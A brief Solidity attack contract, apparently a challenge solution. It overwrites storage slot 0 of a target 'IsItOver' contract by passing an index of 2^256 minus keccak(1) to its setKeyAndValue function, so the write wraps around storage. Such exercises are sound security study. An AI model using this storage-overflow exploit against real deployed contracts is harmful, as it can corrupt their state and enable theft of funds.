pragma solidity ^0.4.21;

import "./Over.sol";


contract IsItOverAttack {
    IsItOver over;
    //The contract has 32 slots, there is the boolean variable stored in slot 0.

    constructor(address _over) public{
        over = IsItOver(_over);
    }

    function attackOver() public
    {   
        //The goal to this attack is to change the slot 0 value of the boolean, for this we need to overflow the storage slot
        // 2^256 - keccak(1)
        uint attackIndex = 2**256 - 90743482286830539503240959006302832933333810038750515972785732718729991261126;
        over.setKeyAndValue(attackIndex,1);
    }
}